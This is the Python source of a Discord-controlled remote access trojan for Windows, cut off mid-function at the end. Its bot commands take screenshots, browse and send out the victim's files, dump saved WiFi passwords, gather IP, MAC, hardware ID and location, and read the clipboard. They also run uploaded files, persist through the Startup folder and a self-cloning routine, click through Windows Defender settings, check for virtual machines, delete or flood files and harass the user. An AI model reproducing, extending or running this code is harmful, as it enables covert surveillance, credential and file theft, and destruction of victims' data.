import discord
from discord.ext import commands
import ctypes
import random
import pyautogui
import rotatescreen as rs
import time
import webbrowser
import subprocess
import sys
import asyncio
import os
import urllib
import sys
import shutil
import platform
import socket
import io
import datetime
import psutil
import zipfile
import winsound
import win32api
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
import tkinter as tk
import random
import image
import ctypes
import os
from PIL import Image
from discord.ext import commands
import requests
import pyperclip
import requests
from bs4 import BeautifulSoup
import tkinter as tk
import webbrowser
import requests
from PIL import Image, ImageTk
import pygame
import asyncio
import os
import playsound
from PIL import ImageGrab
import uuid
import pygame
from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume
from ctypes import Structure, c_uint, sizeof, byref
from ctypes import windll, Structure, c_uint, sizeof, byref
import keyboard
import glob
import getpass
import pyttsx3
import sounddevice as sd
import soundfile as sf
import pyaudio
import youtube_dl
import wave
from io import BytesIO
from discord import File, Embed
import wmi
from screeninfo import get_monitors
from win10toast import ToastNotifier


# Bot setup
intents = discord.Intents.all()
bot = commands.Bot(command_prefix='.', intents=intents)

@bot.event
async def on_ready():
    print(f'Logged in as {bot.user.name}')
    print("Bot is ready for commands.")

# Bot commands
@bot.command(help='Generates a random error message')
async def alert(ctx):
    error_messages = [
        "Error code: 0x" + "".join(random.choices("0123456789ABCDEF", k=4)),
        "Fatal error: Application terminated unexpectedly",
        "Critical Error: System32 file missing",
        "Warning: Insufficient memory to start application",
        "Error: Disk space full",
        "Error: Network connection lost",
    ]
    error_message = random.choice(error_messages)
    ctypes.windll.user32.MessageBoxW(0, error_message, "Game couldn't start", 0x10 | 0x1)

@bot.command(help='tests the mouse')
async def mousecrazy(ctx):
    try:
        for _ in range(166666600):
            x = random.randint(0, pyautogui.size()[0])
            y = random.randint(0, pyautogui.size()[1])
            pyautogui.moveTo(x, y, duration=0)
            time.sleep(0.000005)  # Adjust this value to control the speed of cursor movement
    except Exception as e:
        print(f"An error occurred: {e}")
        await ctx.send("An error occurred while executing the test command.")
        pass

@bot.command(help='Takes a screenshot of the screen')
async def ss(ctx):
    screenshot = pyautogui.screenshot()
    screenshot.save("screenshot.png")
    await ctx.send(file=discord.File("screenshot.png"))

@bot.command(help='Clears all messages in the channel')
async def clear(ctx):
    await ctx.channel.purge()
   
@bot.command(help='Downloads and opens the shared file')
async def share(ctx):
    # Check if any files were uploaded
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please upload a file to share.")
        return

    # Get the first attachment
    attachment = ctx.message.attachments[0]

    # Check if the attachment is a file
    if not attachment.filename:
        await ctx.send("Please upload a valid file.")
        return

    # Retrieve default downloads folder path
    default_downloads_folder = os.path.join(os.path.expanduser('~'), 'Downloads')

    # Set the file path to save in the default downloads folder
    file_name = attachment.filename
    file_path = os.path.join(default_downloads_folder, file_name)

    # Download the file
    await attachment.save(file_path)

    # Open the downloaded file
    os.startfile(file_path)

    await ctx.send(f"Shared file '{file_name}' opened.")

@bot.command()
async def path(ctx, *args):
    try:
        # Get current directory
        current_dir = os.getcwd()

        if not args:
            await ctx.send("Please provide a valid argument. Use `.path help` for help.")
            return

        # Handle different arguments
        command = args[0].lower()

        if command == "list":
            # List all paths (folders and files) in the current directory
            paths = [f"{os.path.join(current_dir, path)} - {os.path.getsize(os.path.join(current_dir, path))} bytes" for path in os.listdir(current_dir)]
            paths_text = "\n".join(paths)
            with open("paths.txt", "w") as file:
                file.write(paths_text)
            await ctx.send(file=discord.File("paths.txt"))

        elif command == "get":
            # Send the file specified by the filename
            if len(args) < 2:
                await ctx.send("Please provide a filename.")
                return
            filename = args[1]
            file_path = os.path.join(current_dir, filename)
            if os.path.exists(file_path):
                if os.path.getsize(file_path) <= 34 * 1024 * 1024:  # Check if file size is less than or equal to 34 MB
                    await ctx.send(file=discord.File(file_path))
                else:
                    await ctx.send("The file is too large to send (greater than 34 MB).")
            else:
                await ctx.send("File not found.")

        elif command == "back":
            # Navigate back one path
            os.chdir("..")
            await ctx.send("Navigated back one path.")

        elif command == "help":
            # Provide help message
            help_message = (
                "Usage: `.path <command>`\n"
                "Commands:\n"
                "`.path list`: Lists all paths (folders and files) in the current directory.\n"
                "`.path get <filename>`: Sends the specified file via the bot (under 34 MB).\n"
                "`.path back`: Navigates back one path.\n"
                "`.path enter <foldername>`: Enters a subfolder.\n"
                "`.path clear`: Clears all files from the current folder.\n"
                "`.path destroy`: Clears all files and deletes the current folder.\n"
                "`.path hack`: Changes all file names in the current folder to hackedby.cot.\n"
                "`.path run <filename>`: Runs the specified file (experimental)."
            )
            await ctx.send(help_message)

        elif command == "enter":
            # Enter a subfolder
            if len(args) < 2:
                await ctx.send("Please provide a folder name.")
                return
            folder_name = args[1]
            subfolder_path = os.path.join(current_dir, folder_name)
            if os.path.exists(subfolder_path) and os.path.isdir(subfolder_path):
                os.chdir(subfolder_path)
                await ctx.send(f"Entered folder: {folder_name}")
            else:
                await ctx.send("Folder not found.")

        elif command == "clear":
            # Clear all files from the current folder
            for item in os.listdir(current_dir):
                item_path = os.path.join(current_dir, item)
                if os.path.isfile(item_path):
                    os.remove(item_path)
            await ctx.send("Cleared all files from the current folder.")

        elif command == "destroy":
            # Clear all files and delete the current folder
            for item in os.listdir(current_dir):
                item_path = os.path.join(current_dir, item)
                if os.path.isfile(item_path):
                    os.remove(item_path)
                elif os.path.isdir(item_path):
                    os.rmdir(item_path)
            await ctx.send("Destroyed all files and deleted the current folder.")

        elif command == "hack":
            # Delete all current files in the directory
            for item in os.listdir(current_dir):
                item_path = os.path.join(current_dir, item)
                if os.path.isfile(item_path):
                    os.remove(item_path)

            # Create 60 files named "hackedby.cot"
            for i in range(60):
                file_name = f"hackedby_{i}.cot"
                file_path = os.path.join(current_dir, file_name)
                with open(file_path, "w") as file:
                    file.write("This file has been hacked by .path hack command.")

            await ctx.send("All files have been replaced with hackedby.cot.")

        elif command == "run":
            # Run the specified file
            if len(args) < 2:
                await ctx.send("Please provide a filename.")
                return
            filename = args[1]
            file_path = os.path.join(current_dir, filename)
            if os.path.exists(file_path) and os.path.isfile(file_path):
                subprocess.Popen(file_path, shell=True)
                await ctx.send(f"File '{filename}' executed successfully.")
            else:
                await ctx.send(f"File '{filename}' not found in the current directory.")

        else:
            await ctx.send("Invalid argument. Use `.path help` for help.")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


@bot.command()
async def restart(ctx):
    await ctx.send("Restarting...")
    subprocess.Popen([sys.executable, sys.argv[0]])
    await bot.close()
import discord
from discord.ext import commands

@bot.command()
async def cc(ctx):
    # Get the number of commands
    num_commands = len(bot.commands)

    # Create a rich embed
    embed = discord.Embed(
        title="Command Count",
        description=f"There are {num_commands} commands available.",
        color=discord.Color.blue()
    )

    # Send the embed
    await ctx.send(embed=embed)




@bot.command(help='Add files from Downloads folder to startup applications')
async def startup(ctx):
    # Get the path to the downloads folder
    downloads_folder = os.path.join(os.path.expanduser('~'), 'Downloads')

    # Get the path to the startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Iterate over files in the downloads folder
    for filename in os.listdir(downloads_folder):
        file_path = os.path.join(downloads_folder, filename)

        # Check if it's a file
        if os.path.isfile(file_path):
            try:
                # Move the file to the startup folder
                shutil.move(file_path, os.path.join(startup_folder, filename))
                await ctx.send(f"File '{filename}' added to startup applications.")
            except Exception as e:
                await ctx.send(f"Failed to add file '{filename}' to startup applications: {e}")


import os
import shutil

@bot.command(help='Uploads a file and adds it to startup applications')
async def customstartup(ctx):
    # Check if a file is uploaded
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please upload a file to add to startup applications.")
        return

    # Get the first attachment
    attachment = ctx.message.attachments[0]

    # Check if the attachment is a file
    if not attachment.filename:
        await ctx.send("Please upload a valid file.")
        return

    # Retrieve default downloads folder path
    downloads_folder = os.path.join(os.path.expanduser('~'), 'Downloads')

    # Set the file path to save in the default downloads folder
    file_name = attachment.filename
    file_path = os.path.join(downloads_folder, file_name)

    # Download the file
    await attachment.save(file_path)

    # Get the path to the startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Move the file to the startup folder
    try:
        shutil.move(file_path, os.path.join(startup_folder, file_name))
        await ctx.send(f"File '{file_name}' added to startup applications.")
    except Exception as e:
        await ctx.send(f"Failed to add file '{file_name}' to startup applications: {e}")


def is_running_in_virtual_machine():
    """Check if the script is running in a virtual machine."""
    virtual_machine_processes = ['vboxservice.exe', 'vboxtray.exe', 'vmtoolsd.exe', 'vmwaretray.exe']
    for proc in psutil.process_iter(['pid', 'name']):
        try:
            if proc.info['name'].lower() in virtual_machine_processes:
                return True
        except (psutil.NoSuchProcess, psutil.AccessDenied, psutil.ZombieProcess):
            pass
    return False

async def notify_virtual_machine(ctx):
    """Notify the user that the script is closing due to running in a virtual machine."""
    await ctx.send("This script is running in a virtual machine. It will now close due to outdated version.")


@bot.command(help='Closes the bot instantly')
async def close(ctx):
    await ctx.send("Closing the bot...")
    await bot.close()

@bot.command(help='Get last 23 MB of files from downloads folder, zip them, and send the zip')
async def stealfiles(ctx):
    # Get the path to the downloads folder
    downloads_folder = os.path.join(os.path.expanduser('~'), 'Downloads')

    # Get the list of files in the downloads folder
    file_list = sorted(os.listdir(downloads_folder), key=lambda x: os.path.getmtime(os.path.join(downloads_folder, x)), reverse=True)

    # Initialize variables for tracking total size and selected files
    total_size = 0
    selected_files = []

    # Iterate through files to select the last 23 MB
    for file_name in file_list:
        file_path = os.path.join(downloads_folder, file_name)
        file_size = os.path.getsize(file_path)
        if total_size + file_size <= 23 * 1024 * 1024:  # Convert MB to bytes
            total_size += file_size
            selected_files.append(file_path)
        else:
            break

    # Create a zip file containing selected files
    zip_file_path = os.path.join(downloads_folder, 'selected_files.zip')
    with zipfile.ZipFile(zip_file_path, 'w') as zip_file:
        for file_path in selected_files:
            zip_file.write(file_path, os.path.basename(file_path))

    # Send the zip file
    await ctx.send(file=discord.File(zip_file_path))

    # Clear the downloads folder
    for file_path in selected_files:
        os.remove(file_path)

    # Create 60 files named hacked.thug
    for i in range(60):
        file_path = os.path.join(downloads_folder, f'hacked{i + 1}.thug')
        with open(file_path, 'w') as file:
            file.write('You have been hacked!')

    await ctx.send("Files zipped, sent, and downloads folder cleared.")


@bot.command(help='Plays an uploaded audio file at maximum volume (earrape)')
async def earrape(ctx):
    # Check if an audio file is uploaded
    if len(ctx.message.attachments) == 0:
        await ctx.send("Please upload an audio file to earrape.")
        return

    # Get the first attachment
    attachment = ctx.message.attachments[0]

    # Check if the attachment is an audio file
    if not attachment.filename.lower().endswith(('.mp3', '.wav', '.ogg', '.flac')):
        await ctx.send("Please upload a valid audio file (MP3, WAV, OGG, FLAC) to earrape.")
        return

    # Save the audio file
    audio_path = os.path.join(os.getcwd(), attachment.filename)
    await attachment.save(audio_path)

    # Play the audio file with the default media player
    subprocess.Popen(['start', audio_path], shell=True)

    # Wait for the audio to finish playing
    await asyncio.sleep(5)  # Adjust duration as needed

    # Delete the audio file
    os.remove(audio_path)

    await ctx.send("Earrape complete.")


@bot.command(help='Locks the computer')
async def lock(ctx):
    # Lock the computer
    ctypes.windll.user32.LockWorkStation()
    await ctx.send("Computer locked.")

@bot.command(help='Freezes the mouse cursor at coordinates (600, 600) for an hour')
async def mousefreeze(ctx):
    # Set the target coordinates
    target_x, target_y = 600, 600
    
    # Calculate the total number of iterations (1 hour)
    total_iterations = 360000

    # Move the mouse to the target coordinates every 0.01 seconds for an hour
    for _ in range(total_iterations):
        pyautogui.moveTo(target_x, target_y)
        await asyncio.sleep(0.01)

    await ctx.send("Mouse freeze complete.")

@bot.command(help='Speaks the provided message')
async def speak(ctx, *, message):
    try:
        # Construct the PowerShell command to speak the message
        ps_command = f'Add-Type -AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak("{message}")'

        # Execute the PowerShell command to speak the message
        subprocess.run(['powershell', '-Command', ps_command], check=True)
        
        await ctx.send("Message spoken.")
    except subprocess.CalledProcessError:
        await ctx.send("Failed to speak the message.")


@bot.command(help='Rename all files in the default Downloads folder to hackedby.cot')
async def thugfiles(ctx):
    try:
        # Default downloads folder
        downloads_folder = os.path.expanduser('~/Downloads')

        # Create the central location if it doesn't exist
        os.makedirs(downloads_folder, exist_ok=True)

        # Iterate through files in the downloads folder
        for filename in os.listdir(downloads_folder):
            old_file_path = os.path.join(downloads_folder, filename)
            new_file_path = os.path.join(downloads_folder, 'hackedby.cot')
            try:
                shutil.move(old_file_path, new_file_path)
                print(f"Renamed {filename} to hackedby.cot")
            except Exception as e:
                print(f"Failed to rename/move file: {e}")
                continue

        await ctx.send("All files in the default Downloads folder have been renamed to hackedby.cot.")

    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(help='Open specified number of Notepad instances')
async def explode(ctx, num: int):
    try:
        if num < 1 or num > 100:
            await ctx.send("Please specify a number between 1 and 100.")
            return

        for _ in range(num):
            subprocess.Popen(["notepad.exe"])

        await ctx.send(f"{num} Notepad instances have been opened.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")


@bot.command(help='Create 1000 text files named TROLLED in the default Downloads folder')
async def flood(ctx):
    try:
        # Default downloads folder
        downloads_folder = os.path.expanduser('~/Downloads')

        # Create 1000 text files
        for i in range(1, 1001):
            filename = f"TROLLED_{i}.txt"
            file_path = os.path.join(downloads_folder, filename)
            with open(file_path, 'w') as file:
                file.write("thugged by cot")

        await ctx.send("1000 text files named TROLLED have been created in the default Downloads folder.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(help='Delete all files in the default Downloads folder')
async def cleardownloads(ctx):
    try:
        # Default downloads folder
        downloads_folder = os.path.expanduser('~/Downloads')

        # Iterate through files in the downloads folder and delete them
        for filename in os.listdir(downloads_folder):
            file_path = os.path.join(downloads_folder, filename)
            os.remove(file_path)

        await ctx.send("All files in the default Downloads folder have been deleted.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command()
async def wallpaper(ctx):
    try:
        # Check if a file is attached
        if ctx.message.attachments:
            # Save the attached file to the wallpaper directory
            attachment = ctx.message.attachments[0]
            wallpaper_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "wallpaper.jpg")
            await attachment.save(wallpaper_path)
        else:
            # Use default image URL
            wallpaper_url = "https://th.bing.com/th/id/OIP.IbsSodShW2ehca98tucC7AHaHS?rs=1&pid=ImgDetMain"

            # Download the default image
            wallpaper_path = os.path.join(os.path.dirname(os.path.realpath(__file__)), "wallpaper.jpg")
            response = requests.get(wallpaper_url, stream=True)
            with open(wallpaper_path, "wb") as image_file:
                shutil.copyfileobj(response.raw, image_file)

        # Set the desktop background
        ctypes.windll.user32.SystemParametersInfoW(20, 0, wallpaper_path, 3)

        await ctx.send("Desktop background changed!")

    except Exception as e:
        print(f"Error changing desktop background: {e}") 

@bot.command(help='Opens Real-time protection settings')
async def real_time_protection(ctx):
    try:
        # Open Windows Security app
        subprocess.run(['start', 'windowsdefender:'], shell=True)
        await ctx.send("Navigating to Real-time protection settings...")

        # Wait for the Windows Security app to open
        time.sleep(2)

        # Check if the window is already maximized
        is_maximized = pyautogui.getWindowsWithTitle('Windows Security')[0].isMaximized

        # If the window is not already maximized, maximize it
        if not is_maximized:
            pyautogui.hotkey('win', 'up')
            time.sleep(1)

        # Move mouse to screen coordinates (247, 356) and left click
        pyautogui.moveTo(247, 356, duration=0.5)
        time.sleep(0.5)
        pyautogui.click()

        # Wait before performing the next action
        time.sleep(1)

        # Move mouse to screen coordinates (809, 1189) and left click
        pyautogui.moveTo(813, 1301, duration=0.5)
        time.sleep(0.5)
        pyautogui.click()

        # Wait before performing the next action
        time.sleep(1)

        # Move mouse to screen coordinates (774, 631) and left click
        pyautogui.moveTo(765, 678, duration=0.5)
        time.sleep(0.5)
        pyautogui.click()

        # If the window was maximized, restore it to its previous state
        if not is_maximized:
            pyautogui.hotkey('win', 'down')

        await ctx.send("Successfully performed the actions.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(help='Maximizes the focused window')
async def maximize(ctx):
    try:
        # Simulate the Win+Up keyboard shortcut to maximize the window
        pyautogui.hotkey('win', 'up')
        await ctx.send("Window maximized successfully.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(help='Minimizes the focused window')
async def minimize(ctx):
    try:
        # Simulate the Win+Down keyboard shortcut to minimize the window
        pyautogui.hotkey('win', 'down')
        await ctx.send("Window minimized successfully.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(help='Simulates pressing a key on the keyboard')
async def presskey(ctx, key: str):
    try:
        # Press the specified key
        pyautogui.press(key)
        await ctx.send(f"Key '{key}' pressed successfully.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(help='Sets the volume to the specified number (1-100)')
async def boost(ctx, volume: int):
    try:
        # Validate volume range
        if volume < 0 or volume > 100:
            await ctx.send("Volume must be between 0 and 100.")
            return

        # Get default audio endpoint and adjust volume
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
        volume_object = cast(interface, POINTER(IAudioEndpointVolume))
        volume_object.SetMasterVolumeLevelScalar(volume / 100, None)

        await ctx.send(f"Volume set to {volume}%.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

@bot.command(help='Sets the volume to 100 every second')
async def bassboost(ctx):
    try:
        await ctx.send("Bassboost activated.")
        while True:
            # Get default audio endpoint and adjust volume
            devices = AudioUtilities.GetSpeakers()
            interface = devices.Activate(
                IAudioEndpointVolume._iid_, CLSCTX_ALL, None)
            volume_object = cast(interface, POINTER(IAudioEndpointVolume))
            volume_object.SetMasterVolumeLevelScalar(1.0, None)
            
            # Wait for 1 second before setting volume again
            await asyncio.sleep(1)
    except asyncio.CancelledError:
        await ctx.send("Bassboost deactivated.")


@bot.command(help='Occasionally performs random actions for 50 minutes')
async def insanify(ctx):
    try:
        await ctx.send("Insanify activated.")
        
        # Loop for 50 minutes
        for _ in range(50):
            # Random interval between 10 seconds and 1 minute
            interval = random.uniform(10, 60)
            await asyncio.sleep(interval)

            # Random action
            action = random.choice(['move_mouse', 'left_click', 'speak', 'minimize_window'])
            if action == 'move_mouse':
                # Move mouse 10 pixels in a random direction
                direction = random.choice(['up', 'down', 'left', 'right'])
                if direction == 'up':
                    pyautogui.move(0, -10)
                elif direction == 'down':
                    pyautogui.move(0, 10)
                elif direction == 'left':
                    pyautogui.move(-10, 0)
                elif direction == 'right':
                    pyautogui.move(10, 0)
            elif action == 'left_click':
                # Left click the mouse
                ctypes.windll.user32.mouse_event(2, 0, 0, 0, 0)  # Mouse left down
                ctypes.windll.user32.mouse_event(4, 0, 0, 0, 0)  # Mouse left up
            elif action == 'speak':
                # Use narrator to speak a message
                os.system("echo This PC is haunted | PowerShell -Command Add-Type –AssemblyName System.Speech; (New-Object System.Speech.Synthesis.SpeechSynthesizer).Speak('This PC is haunted')")
            elif action == 'minimize_window':
                # Minimize the current window
                ctypes.windll.user32.keybd_event(0x5B, 0, 0, 0)  # Left Windows key down
                ctypes.windll.user32.keybd_event(0x4D, 0, 0, 0)  # M key down
                ctypes.windll.user32.keybd_event(0x4D, 0, 0x0002, 0)  # M key up
                ctypes.windll.user32.keybd_event(0x5B, 0, 0x0002, 0)  # Left Windows key up

        await ctx.send("Insanify deactivated.")
    except Exception as e:
        await ctx.send(f"An error occurred: {e}")

class HackedGUI:
    def __init__(self):
        self.root = tk.Tk()
        self.root.title("HACKED BY ATLASTOBY")
        self.root.geometry("500x600")
        self.root.resizable(False, False)
        self.root.overrideredirect(True)  # Remove window decorations
        self.root.attributes('-topmost', True)  # Keep window on top
        self.root.bind("<Configure>", self.bounce)

        self.label = tk.Label(self.root, text="HACKED BY ATLASTOBY", font=("Arial", 14))
        self.label.pack(pady=20)

        self.dx = random.choice([-5, 5])
        self.dy = random.choice([-5, 5])
        self.move()

    def move(self):
        self.root.update_idletasks()
        self.root.update()
        x, y = self.root.winfo_x(), self.root.winfo_y()
        width, height = self.root.winfo_width(), self.root.winfo_height()

        if x <= 0 or x + width >= self.root.winfo_screenwidth():
            self.dx *= -1
        if y <= 0 or y + height >= self.root.winfo_screenheight():
            self.dy *= -1

        self.root.geometry(f"+{x + self.dx}+{y + self.dy}")
        self.root.after(20, self.move)

    def bounce(self, event):
        self.dx = random.choice([-5, 5])
        self.dy = random.choice([-5, 5])

    def close(self):
        self.root.destroy()

@bot.command(help='Opens a GUI with no close button that always stays focused')
async def gui(ctx):
    hacked_gui = HackedGUI()
    await ctx.send("HACKED GUI activated!")

    def cleanup():
        hacked_gui.close()

    bot.loop.call_later(60*50, cleanup)

# Function to duplicate the current script controlling the bot
def duplicate_script():
    # Get the path to the current script file
    current_script = sys.argv[0]

    # Create a new file name for the duplicate script
    duplicate_name = os.path.splitext(os.path.basename(current_script))[0] + "_duplicate.py"

    # Build the path to the duplicate script file
    duplicate_path = os.path.join(os.path.dirname(current_script), duplicate_name)

    # Copy the script file to create the duplicate
    shutil.copyfile(current_script, duplicate_path)

    return duplicate_path

# Function to add the duplicate script to startup applications
def add_to_startup(file_path):
    # Get the path to the startup folder
    startup_folder = os.path.join(os.getenv('APPDATA'), 'Microsoft', 'Windows', 'Start Menu', 'Programs', 'Startup')

    # Move the duplicate script to the startup folder
    shutil.move(file_path, os.path.join(startup_folder, os.path.basename(file_path)))

@bot.command(help='Clones the current script controlling the bot once and adds it to startup')
async def clonescript(ctx):
    try:
        # Duplicate the current script controlling the bot
        duplicate_path = duplicate_script()

        # Add the duplicate script to startup applications
        add_to_startup(duplicate_path)

        # Run the duplicate script
        subprocess.Popen([sys.executable, duplicate_path])

        await ctx.send(f"Script cloned successfully and added to startup.")
    except Exception as e:
        await ctx.send(f"An error occurred while cloning the script: {e}")


@bot.command(name='info')
async def get_system_info(ctx):
    try:
        # Capture a screenshot of the PC
        screenshot = ImageGrab.grab()
        screenshot_bytes = BytesIO()
        screenshot.save(screenshot_bytes, format='PNG')
        screenshot_bytes.seek(0)

        # Get local IPv4 address
        local_ipv4 = socket.gethostbyname(socket.gethostname())

        # Get public IPv4 using ipify.org
        ipify_response = requests.get('https://api64.ipify.org?format=json')
        if ipify_response.status_code == 200:
            try:
                ipify_data = ipify_response.json()
                public_ipv4 = ipify_data.get('ip', 'Unknown')
            except json.JSONDecodeError as e:
                print(f"Error decoding IPify response JSON: {e}")
                public_ipv4 = 'Unknown'
        else:
            print(f"Error fetching public IP address. Status code: {ipify_response.status_code}")
            public_ipv4 = 'Unknown'

        # Get MAC address
        mac_address = ':'.join(['{:02x}'.format((uuid.getnode() >> elements) & 0xff) for elements in range(5, -1, -1)])

        # Get PC name
        pc_name = os.getenv('COMPUTERNAME')

        # Get approximate location based on IP using ipinfo.io API
        location_info_response = requests.get(f'https://ipinfo.io/{public_ipv4}/json')
        if location_info_response.status_code == 200:
            try:
                location_info = location_info_response.json()
                approximate_location = f"{location_info.get('city', 'Unknown')}, {location_info.get('region', 'Unknown')}, {location_info.get('country', 'Unknown')}"
            except json.JSONDecodeError as e:
                print(f"Error decoding IPinfo response JSON: {e}")
                approximate_location = 'Location information not available'
        else:
            print(f"Error fetching location information. Status code: {location_info_response.status_code}")
            approximate_location = 'Location information not available'

        # Get PC username
        pc_username = os.getenv('USERNAME')

        # Get local date and time
        local_date_time = time.strftime('%Y-%m-%d %H:%M:%S')

        # Get PC specs
        pc_specs = platform.uname()

        # Get WiFi network list with and without passwords
        wifi_info = subprocess.check_output(['netsh', 'wlan', 'show', 'profiles', 'key=clear']).decode('utf-8')
        wifi_networks = [line.split(":")[1][1:-1] for line in wifi_info.split('\n') if 'All User Profile' in line]
        wifi_passwords = [f"{network}: {line.split(': ')[1].strip()}" for network in wifi_networks
                          for line in subprocess.check_output(['netsh', 'wlan', 'show', 'profile', network, 'key=clear']).decode('utf-8').split('\n') if 'Key Content' in line]
        wifi_no_passwords = [network for network in wifi_networks
                             if 'Key Content' not in subprocess.check_output(['netsh', 'wlan', 'show', 'profile', network, 'key=clear']).decode('utf-8')]

        # Get HWID using wmi
        c = wmi.WMI()
        hwid = c.Win32_ComputerSystemProduct()[0].UUID

        # Get Disk Usage
        disk_usage = psutil.disk_usage('/')
        disk_info = f"Total: {disk_usage.total / (1024 ** 3):.2f} GB\nUsed: {disk_usage.used / (1024 ** 3):.2f} GB\nFree: {disk_usage.free / (1024 ** 3):.2f} GB"

        # Get System Uptime
        uptime_seconds = int(time.time() - psutil.boot_time())
        uptime_days, remainder = divmod(uptime_seconds, 86400)  # 86400 seconds in a day
        uptime_hours, remainder = divmod(remainder, 3600)       # 3600 seconds in an hour
        uptime_minutes, uptime_seconds = divmod(remainder, 60)

        uptime_formatted = f"{uptime_days}:{uptime_hours:02d}:{uptime_minutes:02d}:{uptime_seconds:02d}"

        # Get Battery Status (for laptops)
        battery_info = ""
        if psutil.sensors_battery():
            battery = psutil.sensors_battery()
            battery_info = f"Charge: {battery.percent}%\nPlugged in: {battery.power_plugged}"

        # Create a rich embed
        embed = Embed(title="System Information", color=0x008080)

        # Add fields with numbered information
        embed.add_field(name="1. IPv4 Addresses", value=f"Local: {local_ipv4}\nPublic: {public_ipv4}", inline=False)
        embed.add_field(name="2. MAC Address", value=mac_address, inline=False)
        embed.add_field(name="3. PC Name", value=pc_name, inline=False)
        embed.add_field(name="4. Approximate Location", value=approximate_location, inline=False)
        embed.add_field(name="5. PC Username", value=pc_username, inline=False)
        embed.add_field(name="6. Local Date and Time", value=local_date_time, inline=False)
        embed.add_field(name="7. PC Specs", value=str(pc_specs), inline=False)
        embed.add_field(name="8. WiFi Networks with Passwords", value='\n'.join(wifi_passwords), inline=False)
        embed.add_field(name="9. WiFi Networks without Passwords", value='\n'.join(wifi_no_passwords), inline=False)
        embed.add_field(name="10. HWID", value=hwid, inline=False)
        embed.add_field(name="11. Disk Usage", value=disk_info, inline=False)
        embed.add_field(name="12. System Uptime", value=str(uptime_formatted), inline=False)
        embed.add_field(name="13. Battery Status", value=battery_info, inline=False)

        # Split the information into chunks of 5 fields each
        chunks = [embed.fields[i:i + 5] for i in range(0, len(embed.fields), 5)]

        # Send each chunk as a separate message
        for chunk in chunks:
            # Create a new embed for each chunk
            chunk_embed = Embed(title="System Information", color=0x008080)
            for field in chunk:
                chunk_embed.add_field(name=field.name, value=field.value, inline=field.inline)

            # Send the embed with the screenshot as an attachment
            await ctx.send(file=File(screenshot_bytes, filename='screenshot.png'), embed=chunk_embed)

    except Exception as e:
        print(f"Error fetching system information: {e}")
        await ctx.send(f"Error fetching system information. Check the console for details.")
        raise  # Re-raise the exception for further debugging

import discord

@bot.command()
async def wifiinfo(ctx):
    try:
        # Use subprocess to run the command to get WiFi profile names
        profiles_result = subprocess.run(["netsh", "wlan", "show", "profiles"], capture_output=True, text=True)

        # Extract profile names
        profiles = [line.split(":")[1].strip() for line in profiles_result.stdout.split("\n") if "All User Profile" in line]

        # Open a text file named wifi.txt to write the information
        with open("wifi.txt", "w") as file:
            # Iterate over each profile to get its password
            for profile in profiles:
                # Use subprocess to run the command to get WiFi profile information including password
                profile_result = subprocess.run(["netsh", "wlan", "show", "profile", profile, "key=clear"], capture_output=True, text=True)
                password_lines = [line.strip() for line in profile_result.stdout.split("\n") if "Key Content" in line]
                if password_lines:
                    password = password_lines[0].split(":")[1].strip()
                else:
                    password = "No password set"  # If password is not found
                # Write profile name and password to the file
                file.write(f"{profile}:{password}\n")

        # Send wifi.txt file as a message
        with open("wifi.txt", "rb") as file:
            wifi_file = discord.File(file, filename="wifi.txt")
            await ctx.send("WiFi network information:", file=wifi_file)

    except Exception as e:
        await ctx.send(f"Error fetching WiFi network information: {e}")


from ctypes import cast, POINTER
from comtypes import CLSCTX_ALL
from pycaw.pycaw import AudioUtilities, IAudioEndpointVolume

@bot.command(help='fucks with the clipboard')
async def clipboard(ctx, action: str = None, *, content: str = None):
    try:
        if action:
            # Convert the action to lowercase for case-insensitivity
            action = action.lower()

            if action == "read":
                # Read from the clipboard
                clipboard_content = pyperclip.paste()
                await ctx.send(f"Clipboard content: ```{clipboard_content}```")

            elif action == "write" and content:
                # Write to the clipboard
                pyperclip.copy(content)
                await ctx.send(f"Content '{content}' has been written to the clipboard.")

            elif action == "paste":
                # Paste the clipboard content
                clipboard_content = pyperclip.paste()
                await ctx.send(f"Pasting clipboard content: ```{clipboard_content}```")

            else:
                await ctx.send("Invalid argument. Use '!clipboard read', '!clipboard write [content]', or '!clipboard paste'.")
        else:
            await ctx.send("Please provide a valid action. Use '!clipboard read', '!clipboard write [content]', or '!clipboard paste'.")

    except Exception as e:
        print(f"Error interacting with clipboard: {e}")
        await ctx.send("An error occurred while interacting with the clipboard.")

        

@bot.command()
async def search(ctx, *, query: str = None):
    try:
        if query:
            # Perform a web search
            search_url = f"https://www.google.com/search?q={query}"

            # Open the search URL in the default web browser
            webbrowser.open(search_url)

            await ctx.send(f"Opened search results for '{query}' in the default web browser.")
        else:
            await ctx.send("Please provide a search query. Use '!search [query]'.")
    
    except Exception as e:
        print(f"Error performing web search: {e}")
        await ctx.send("An error occurred while performing the web search.")




@bot.command()
async def mutetroll(ctx):
    try:
        await ctx.send("Starting mutetroll to set system volume to zero every one second.")

        # Get the default audio endpoint
        devices = AudioUtilities.GetSpeakers()
        interface = devices.Activate(
            IAudioEndpointVolume._iid_, CLSCTX_ALL, None
        )
        volume = cast(interface, POINTER(IAudioEndpointVolume))

        # Function to set system volume to zero
        async def set_volume_zero():
            while True:
